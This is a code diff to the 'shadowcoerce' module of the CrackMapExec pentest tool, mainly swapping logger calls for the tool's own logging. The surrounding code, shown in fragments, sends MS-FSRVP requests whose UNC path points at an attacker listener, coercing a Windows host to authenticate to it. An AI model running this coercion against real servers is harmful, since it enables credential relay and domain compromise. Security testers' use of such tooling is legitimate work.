@@ -2,7 +2,6 @@
 # -*- coding: utf-8 -*-
 
 import time
-import logging 
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL
@@ -11,10 +10,10 @@ from impacket.uuid import uuidtup_to_bin
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.smbconnection import SessionError
+from cme.logger import cme_logger
 
 
 class CMEModule:
-    
     name = 'shadowcoerce'
     description = "Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam"
     supported_protocols = ['smb']
@@ -40,31 +39,31 @@ class CMEModule:
 
         # If pipe not available, try again. "TL;DR: run the command twice if it doesn't work." - @Shutdown
         if dce == 1:
-            logger.debug("First try failed. Creating another dce connection...")
+            context.log.debug("First try failed. Creating another dce connection...")
             # Sleeping mandatory for second try
             time.sleep(2)
             dce = c.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe="FssagentRpc")
         
         if self.ipsc: 
-            logger.debug("ipsc = %s", self.ipsc)
-            logger.debug("Using IsPathShadowCopied!")
+            context.log.debug("ipsc = %s", self.ipsc)
+            context.log.debug("Using IsPathShadowCopied!")
             result = c.IsPathShadowCopied(dce, self.listener)
         else:
-            logger.debug("ipsc = %s", self.ipsc)
-            logger.debug("Using the default IsPathSupported")
+            context.log.debug("ipsc = %s", self.ipsc)
+            context.log.debug("Using the default IsPathSupported")
             result = c.IsPathSupported(dce, self.listener)
 
         try:
             dce.disconnect()
         except SessionError as e:
-            logger.debug(f"Error disconnecting DCE session: {e}")
+            context.log.debug(f"Error disconnecting DCE session: {e}")
 
         if result: 
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/ShutdownRepo/ShadowCoerce")
         
         else:
-            logger.debug("Target not vulnerable to ShadowCoerce")
+            context.log.debug("Target not vulnerable to ShadowCoerce")
 
 
 class DCERPCSessionError(DCERPCException):
@@ -138,7 +137,7 @@ OPNUMS = {
 }
 
 
-class CoerceAuth():
+class CoerceAuth:
     def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost):
         binding_params = {
             'FssagentRpc': {
@@ -160,7 +159,7 @@ class CoerceAuth():
             rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
-        logger.debug("Connecting to %s" % binding_params[pipe]['stringBinding'])
+        cme_logger.info("Connecting to %s" % binding_params[pipe]['stringBinding'])
         
         try:
             dce.connect()
@@ -170,20 +169,20 @@ class CoerceAuth():
                 dce.disconnect()
                 return 1
 
-            logger.debug("Something went wrong, check error status => %s" % str(e))            
+            cme_logger.debug("Something went wrong, check error status => %s" % str(e))
 
-        logger.debug("Connected!")
-        logger.debug("Binding to %s" % binding_params[pipe]['UUID'][0])
+        cme_logger.info("Connected!")
+        cme_logger.info("Binding to %s" % binding_params[pipe]['UUID'][0])
         try:
             dce.bind(uuidtup_to_bin(binding_params[pipe]['UUID']))
         except Exception as e:
-            logger.debug("Something went wrong, check error status => %s" % str(e))
+            cme_logger.debug("Something went wrong, check error status => %s" % str(e))
 
-        logger.debug("Successfully bound!")
+        cme_logger.info("Successfully bound!")
         return dce
 
     def IsPathShadowCopied(self, dce, listener):
-        logger.debug("Sending IsPathShadowCopied!")
+        cme_logger.debug("Sending IsPathShadowCopied!")
         try:
             request = IsPathShadowCopied()
             # only NETLOGON and SYSVOL were detected working here
@@ -192,14 +191,14 @@ class CoerceAuth():
             # request.dump()
             dce.request(request)
         except Exception as e:
-            logger.debug("Something went wrong, check error status => %s", str(e))
-            logger.debug("Attack may of may not have worked, check your listener...")
+            cme_logger.debug("Something went wrong, check error status => %s", str(e))
+            cme_logger.debug("Attack may of may not have worked, check your listener...")
             return False 
 
         return True 
 
     def IsPathSupported(self, dce, listener):
-        logger.debug("Sending IsPathSupported!")
+        cme_logger.debug("Sending IsPathSupported!")
         try:
             request = IsPathSupported()
             # only NETLOGON and SYSVOL were detected working here
@@ -207,8 +206,8 @@ class CoerceAuth():
             request['ShareName'] = '\\\\%s\\NETLOGON\x00' % listener
             dce.request(request)
         except Exception as e:
-            logger.debug("Something went wrong, check error status => %s", str(e))
-            logger.debug("Attack may of may not have worked, check your listener...")
+            cme_logger.debug("Something went wrong, check error status => %s", str(e))
+            cme_logger.debug("Attack may of may not have worked, check your listener...")
             return False 
 
         return True
